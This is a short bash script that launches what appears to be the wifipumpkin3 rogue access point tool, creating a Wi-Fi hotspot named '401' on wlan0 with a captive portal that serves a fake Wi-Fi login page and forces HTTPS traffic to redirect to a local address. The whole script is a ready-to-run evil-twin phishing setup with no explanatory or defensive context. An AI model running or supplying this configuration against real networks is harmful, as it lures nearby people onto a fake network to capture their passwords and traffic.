#!/bin/bash
eval "$(conda shell.bash hook)"
conda activate wifi
wp3 --xpulp " \
set ssid 401; \
set interface wlan0; \
set proxy captiveflask; \
set captiveflask.WifiLogin true; \
set captiveflask.force_redirect_https_connection true; \
set captiveflask.force_redirect_to_url http://10.0.0.1; \
ignore pydns_server; \
set mode docker; \
start
"
